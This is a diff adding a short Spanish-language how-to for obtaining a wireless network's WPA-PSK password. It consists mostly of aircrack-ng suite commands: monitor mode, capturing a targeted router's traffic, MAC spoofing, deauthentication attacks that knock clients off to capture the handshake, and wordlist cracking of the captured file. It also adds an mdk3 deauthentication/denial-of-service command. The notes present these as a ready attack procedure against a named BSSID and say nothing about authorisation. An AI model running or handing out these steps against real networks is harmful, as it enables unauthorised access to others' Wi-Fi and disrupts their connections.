@@ -1,0 +1,57 @@
+Obtener la password de una red inalámbrica
+------------------------------------------
+
+Primero hay que buscar redes con autenticación PSK. Para ello se ejecuta el siguiente comando que puede mostrarnos qué redes cumplen con esta condición.
+
+# airmon-ng start wlan0
+# airodump-ng mon0
+
+( el primer comando es para poner la tarjeta wireless en modo monitor  )
+
+Segundo, se debe elegir uno de los routers y mantener un escáner en una consola del tráfico que hay en el router con el siguiente comando:
+
+# airodump-ng --bssid 00:22:57:61:62:13 -c 6 --write WPAcrack mon0
+
+-bssid: se obtiene del comando anterior.
+-c: es el canal.
+--write: indica el archivo que se va a escribir con los resultados.
+
+Fuente:
+http://www.aircrack-ng.org/doku.php?id=es:airodump-ng
+
+En otra consola, se debe cortar las conexiones para que se vuelvan a autenticar los clientes (o un cliente específico) con un ataque. Cuando el o los clientes quieran volver a conectarse, se intentará obtener la contraseña encriptada que se verá reflejado en la consola anterior.
+
+# ifconfig mon0 down
+# macchanger -r mon0
+# ifconfig mon0 up
+// Estas 3 últimas líneas son opcionales
+# airmon-ng stop wlan0 6
+# airmon-ng start wlan0 6
+// siendo 6 el canal del router a atacar
+# aireplay-ng -0 100 -a 00:22:57:61:62:13 mon0
+
+100: cantidad de ataques.
+-a: dirección MAC que indica el router.
+mon0: especifica nuestro cliente.
+
+Al final, cuando se algún cliente hace Handshake. Se debe crackear la password codificada con:
+# aircrack-ng WPAcrack-05.cap -w darkc0de.lst
+
+
+Fuente:
+http://www.aircrack-ng.org/doku.php?id=deauthentication
+
+Asociado a DDoS:
+http://hacking-etico.com/2013/03/13/ataque-dos-wifi/
+http://mightyshouts.com/ddos-attack/
+
+---------------------------
+También se puede realizar este ataque con el comando "mdk3 mon0 d -b 00:00:00:00:00:00"
+Fuente:
+https://www.youtube.com/watch?v=YRwFdKRQD34
+-----------------------------
+
+Fuente general:
+http://null-byte.wonderhowto.com/how-to/hack-wi-fi-cracking-wpa2-psk-passwords-using-aircrack-ng-0148366/
+
+
